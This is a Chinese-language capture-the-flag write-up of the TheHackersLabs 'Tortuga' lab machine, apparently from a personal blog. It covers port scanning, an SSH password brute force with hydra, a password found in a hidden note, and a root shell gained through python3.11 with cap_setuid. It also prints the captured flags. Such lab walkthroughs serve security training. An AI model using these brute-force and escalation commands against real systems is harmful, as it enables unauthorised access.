{"pageProps":{"postData":{"id":"TheHackersLabsTortuga","contentHtml":"<h1>Tortuga</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/131\">https://labs.thehackerslabs.com/machine/131</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsTortuga/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Tortuga nmap -sT -min-rate 10000 -p- 192.168.56.120\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:50 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.120\nHost is up (0.00076s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 3.92 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Tortuga nmap -sT -A -p 22,80 192.168.56.120                                            \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:51 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.120\nHost is up (0.00040s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)\n| ssh-hostkey: \n|   256 bd:bc:74:bc:a6:ab:09:29:2d:88:42:16:91:93:b1:a4 (ECDSA)\n|_  256 3b:99:fe:7e:ab:ae:b3:a7:05:b2:d1:73:08:6e:e7:a9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Isla Tortuga\nMAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.40 ms 192.168.56.120\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 8.53 seconds\n</code></pre>\n<h3>枚举</h3>\n<p>HTTP</p>\n<p><img src=\"/post-images/TheHackersLabsTortuga/image1.png\" alt=\"image.png\"></p>\n<p>页面中的两个链接</p>\n<pre><code class=\"hljs language-bash\">La Tripulación de Tortuga 海龟船员\n\n    Capitán Barbanegra – Estratega implacable. 黑胡子船长 – 无情的战略家。\n    Corsario Rojo – Maestro de la espada.\n    红色海盗船 – 剑之大师。\n    Grumete Verde – Aprendiz despistado. 绿色小屋男孩 – 心不在焉的学徒。\n    Timón de Hierro – El que nunca pierde el rumbo.\n    铁舵——永不迷路的人。\n\n<span class=\"hljs-string\">\"Quien domine el timón hallará el rumbo a la victoria...\"</span>\n“谁主宰舵，谁就会找到胜利之路......”\n\n<span class=\"hljs-string\">\"Recuerda: el viejo truco de las rutas dobles siempre funciona...\"</span>\n“记住：双路线的老把戏总是有效的......”\n</code></pre>\n<pre><code class=\"hljs language-bash\">Mapa de Isla Tortuga 托尔图加岛地图\n\n~~~~~~~~~~~~~~~~~~~\n~     PIRATE BAY   ~\n~~~~~~~~~~~~~~~~~~~\n       |   |\n       |   |    X  (tesoro enterrado)\n       |   |\n~~~~~~~~~~~~~~~~~~~\n~     PUERTO       ~\n~~~~~~~~~~~~~~~~~~~\n    \n\nUna nota arrugada se lee en la esquina del mapa...\n地图的角落里写着一张皱巴巴的纸条......\n\n<span class=\"hljs-string\">\"Ey grumete revisa la nota oculta que dejado en tu camarote...\"</span>\n“嘿，船舱男孩，检查一下我留在你船舱里的隐藏纸条......”\n</code></pre>\n<p>“<code>grumete</code> 检查船舱里的隐藏纸条“ 感觉是一个目录或者用户</p>\n<p>目录扫描无结果</p>\n<pre><code class=\"hljs language-bash\">➜  Tortuga gobuster <span class=\"hljs-built_in\">dir</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.120/grumete\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.120/grumete\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\nProgress: 661680 / 661683 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>进行 <code>ssh</code> 爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Tortuga hydra -l grumete -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.120 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC &#x26; David Maciejak - Please <span class=\"hljs-keyword\">do</span> not use <span class=\"hljs-keyword\">in</span> military or secret service organizations, or <span class=\"hljs-keyword\">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 17:10:39\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.120:22/\n[STATUS] 121.00 tries/min, 121 tries <span class=\"hljs-keyword\">in</span> 00:01h, 14344278 to <span class=\"hljs-keyword\">do</span> <span class=\"hljs-keyword\">in</span> 1975:48h, 8 active\n[STATUS] 120.00 tries/min, 360 tries <span class=\"hljs-keyword\">in</span> 00:03h, 14344039 to <span class=\"hljs-keyword\">do</span> <span class=\"hljs-keyword\">in</span> 1992:14h, 8 active\n[STATUS] 121.29 tries/min, 849 tries <span class=\"hljs-keyword\">in</span> 00:07h, 14343550 to <span class=\"hljs-keyword\">do</span> <span class=\"hljs-keyword\">in</span> 1971:03h, 8 active\n[22][ssh] host: 192.168.56.120   login: grumete   password: 1234\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 17:19:48\n</code></pre>\n<p>得到密码 <code>1234</code></p>\n<p>进去后能读取 user.txt</p>\n<pre><code class=\"hljs language-bash\">grumete@TheHackersLabs-Tortuga:~$ <span class=\"hljs-built_in\">cat</span> user.txt \n26411abdb6301c1d28617bd5ac7ec81b\n</code></pre>\n<h2>权限提升</h2>\n<h3>信息收集</h3>\n<p>家目录下 <code>.nota.txt</code> 得到一个密码 <code>mar_de_fuego123</code></p>\n<pre><code class=\"hljs language-less\"><span class=\"hljs-selector-tag\">grumete</span>@<span class=\"hljs-selector-tag\">TheHackersLabs-Tortuga</span>:~$ <span class=\"hljs-selector-tag\">cat</span> <span class=\"hljs-selector-class\">.nota</span><span class=\"hljs-selector-class\">.txt</span>\n<span class=\"hljs-selector-tag\">Querido</span> <span class=\"hljs-selector-tag\">grumete</span>,\n\n<span class=\"hljs-selector-tag\">Parto</span> <span class=\"hljs-selector-tag\">rumbo</span> <span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">la</span> <span class=\"hljs-selector-tag\">isla</span> <span class=\"hljs-selector-tag\">vecina</span> <span class=\"hljs-selector-tag\">por</span> <span class=\"hljs-selector-tag\">asuntos</span> <span class=\"hljs-selector-tag\">que</span> <span class=\"hljs-selector-tag\">no</span> <span class=\"hljs-selector-tag\">pueden</span> <span class=\"hljs-selector-tag\">esperar</span>, <span class=\"hljs-selector-tag\">estar</span>é <span class=\"hljs-selector-tag\">fuera</span> <span class=\"hljs-selector-tag\">un</span> <span class=\"hljs-selector-tag\">par</span> <span class=\"hljs-selector-tag\">de</span> <span class=\"hljs-selector-tag\">d</span>í<span class=\"hljs-selector-tag\">as</span>.\n<span class=\"hljs-selector-tag\">Mientras</span> <span class=\"hljs-selector-tag\">tanto</span>, <span class=\"hljs-selector-tag\">conf</span>í<span class=\"hljs-selector-tag\">o</span> <span class=\"hljs-selector-tag\">en</span> <span class=\"hljs-selector-tag\">ti</span> <span class=\"hljs-selector-tag\">para</span> <span class=\"hljs-selector-tag\">que</span> <span class=\"hljs-selector-tag\">cuides</span> <span class=\"hljs-selector-tag\">del</span> <span class=\"hljs-selector-tag\">barco</span> <span class=\"hljs-selector-tag\">y</span> <span class=\"hljs-selector-tag\">de</span> <span class=\"hljs-selector-tag\">la</span> <span class=\"hljs-selector-tag\">tripulaci</span>ó<span class=\"hljs-selector-tag\">n</span> <span class=\"hljs-selector-tag\">como</span> <span class=\"hljs-selector-tag\">si</span> <span class=\"hljs-selector-tag\">fueran</span> <span class=\"hljs-selector-tag\">m</span>í<span class=\"hljs-selector-tag\">os</span>.\n\n<span class=\"hljs-selector-tag\">La</span> <span class=\"hljs-selector-tag\">puerta</span> <span class=\"hljs-selector-tag\">de</span> <span class=\"hljs-selector-tag\">la</span> <span class=\"hljs-selector-tag\">c</span>á<span class=\"hljs-selector-tag\">mara</span> <span class=\"hljs-selector-tag\">del</span> <span class=\"hljs-selector-tag\">tim</span>ó<span class=\"hljs-selector-tag\">n</span> <span class=\"hljs-selector-tag\">est</span>á <span class=\"hljs-selector-tag\">asegurada</span> <span class=\"hljs-selector-tag\">con</span> <span class=\"hljs-selector-tag\">la</span> <span class=\"hljs-selector-tag\">contrase</span>ñ<span class=\"hljs-selector-tag\">a</span>:\n    \"<span class=\"hljs-selector-tag\">mar_de_fuego123</span>\"\n\n<span class=\"hljs-selector-tag\">Recuerda</span>, <span class=\"hljs-selector-tag\">no</span> <span class=\"hljs-selector-tag\">se</span> <span class=\"hljs-selector-tag\">la</span> <span class=\"hljs-selector-tag\">reveles</span> <span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">nadie</span> <span class=\"hljs-selector-tag\">m</span>á<span class=\"hljs-selector-tag\">s</span>. <span class=\"hljs-selector-tag\">Has</span> <span class=\"hljs-selector-tag\">demostrado</span> <span class=\"hljs-selector-tag\">ser</span> <span class=\"hljs-selector-tag\">leal</span> <span class=\"hljs-selector-tag\">y</span> <span class=\"hljs-selector-tag\">firme</span> <span class=\"hljs-selector-tag\">durante</span> <span class=\"hljs-selector-tag\">todos</span> <span class=\"hljs-selector-tag\">estos</span> <span class=\"hljs-selector-tag\">a</span>ñ<span class=\"hljs-selector-tag\">os</span>\n<span class=\"hljs-selector-tag\">navegando</span> <span class=\"hljs-selector-tag\">juntos</span>, <span class=\"hljs-selector-tag\">y</span> <span class=\"hljs-selector-tag\">eres</span> <span class=\"hljs-selector-tag\">en</span> <span class=\"hljs-selector-tag\">quien</span> <span class=\"hljs-selector-tag\">m</span>á<span class=\"hljs-selector-tag\">s</span> <span class=\"hljs-selector-tag\">conf</span>í<span class=\"hljs-selector-tag\">o</span> <span class=\"hljs-selector-tag\">en</span> <span class=\"hljs-selector-tag\">estos</span> <span class=\"hljs-selector-tag\">mares</span> <span class=\"hljs-selector-tag\">traicioneros</span>.\n\n<span class=\"hljs-selector-tag\">Mant</span>é<span class=\"hljs-selector-tag\">n</span> <span class=\"hljs-selector-tag\">la</span> <span class=\"hljs-selector-tag\">guardia</span> <span class=\"hljs-selector-tag\">alta</span>, <span class=\"hljs-selector-tag\">vigila</span> <span class=\"hljs-selector-tag\">las</span> <span class=\"hljs-selector-tag\">provisiones</span> <span class=\"hljs-selector-tag\">y</span> <span class=\"hljs-selector-tag\">cuida</span> <span class=\"hljs-selector-tag\">de</span> <span class=\"hljs-selector-tag\">que</span> <span class=\"hljs-selector-tag\">ning</span>ú<span class=\"hljs-selector-tag\">n</span> <span class=\"hljs-selector-tag\">intruso</span> <span class=\"hljs-selector-tag\">ponga</span> <span class=\"hljs-selector-tag\">un</span> <span class=\"hljs-selector-tag\">pie</span> <span class=\"hljs-selector-tag\">en</span> <span class=\"hljs-selector-tag\">cubierta</span>.\n<span class=\"hljs-selector-tag\">Cuando</span> <span class=\"hljs-selector-tag\">regrese</span>, <span class=\"hljs-selector-tag\">espero</span> <span class=\"hljs-selector-tag\">encontrar</span> <span class=\"hljs-selector-tag\">el</span> <span class=\"hljs-selector-tag\">barco</span> <span class=\"hljs-selector-tag\">tal</span> <span class=\"hljs-selector-tag\">y</span> <span class=\"hljs-selector-tag\">como</span> <span class=\"hljs-selector-tag\">lo</span> <span class=\"hljs-selector-tag\">dejo</span> <span class=\"hljs-selector-tag\">hoy</span> (¡y nada de usar la bodega de ron\npara hacer carreras de tortugas otra vez!).\n\n<span class=\"hljs-selector-tag\">Con</span> <span class=\"hljs-selector-tag\">la</span> <span class=\"hljs-selector-tag\">confianza</span> <span class=\"hljs-selector-tag\">de</span> <span class=\"hljs-selector-tag\">siempre</span>,\n— <span class=\"hljs-selector-tag\">El</span> <span class=\"hljs-selector-tag\">Capit</span>á<span class=\"hljs-selector-tag\">n</span>\n</code></pre>\n<p>是用户 capitan 的密码</p>\n<p><img src=\"/post-images/TheHackersLabsTortuga/image2.png\" alt=\"image.png\"></p>\n<p>上传 <code>linepas</code> 扫一波，发现 python 设置了特殊权限</p>\n<p><img src=\"/post-images/TheHackersLabsTortuga/image3.png\" alt=\"image.png\"></p>\n<ul>\n<li><strong><code>setcap</code></strong>: 这是用来设置文件 Capabilities 的命令。</li>\n<li><strong><code>cap_setuid</code></strong>: 这是要授予的具体能力。<code>CAP_SETUID</code> 允许一个进程改变其 UID（用户ID）。这是 SUID (Set User ID) 权限的核心能力。拥有这个能力的进程可以调用 <code>setuid(0)</code> 来将自己变成 root 用户。</li>\n<li><strong><code>=ep</code></strong>: 这指定了要将 <code>cap_setuid</code> 添加到哪些 Capability 集合中。\n<ul>\n<li><strong><code>e</code> (Effective)</strong>: 有效集合。表示当程序运行时，这个能力<strong>立即生效</strong>。这是提权的关键。</li>\n<li><strong><code>p</code> (Permitted)</strong>: 许可集合。表示程序被<strong>允许</strong>拥有这个能力，即使它暂时没有使用。</li>\n</ul>\n</li>\n<li><strong><code>/usr/bin/python3.11</code></strong>: 这是被赋予能力的目标文件，即 Python 3.11 的可执行程序。</li>\n</ul>\n<pre><code class=\"hljs language-bash\">capitan@TheHackersLabs-Tortuga:/tmp$ /usr/bin/python3.11 -c <span class=\"hljs-string\">'import os; os.setuid(0); os.system(\"/bin/bash\")'</span>\nroot@TheHackersLabs-Tortuga:/tmp# \n</code></pre>\n<p>读取 root.txt</p>\n<pre><code class=\"hljs language-bash\">root@TheHackersLabs-Tortuga:/root# <span class=\"hljs-built_in\">cat</span> root.txt \nc3f63456632bd27e1d5602827c2b59ae\n</code></pre>","title":"TheHackersLabs - Tortuga","date":"2025-10-01","updated":"2025-10-01","tags":["TheHackersLabs","Linux","brute","Cappbilities"],"categories":"靶机","comments":true,"description":"Tortuga\n\n https://labs.thehackerslabs.com/machine/131\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n枚举\n\nHTTP\n\n\n\n页面中的两个链接\n\n\n\n\n\n“`grumete` 检查船舱里的隐藏纸条“ 感觉是一个目录或者用户\n\n目录扫描无结果\n\n\n\n进行 `ssh` 爆破\n\n\n\n得到密码 `1234`\n\n进去后能读取 user.txt\n\n\n\n..."}},"__N_SSG":true}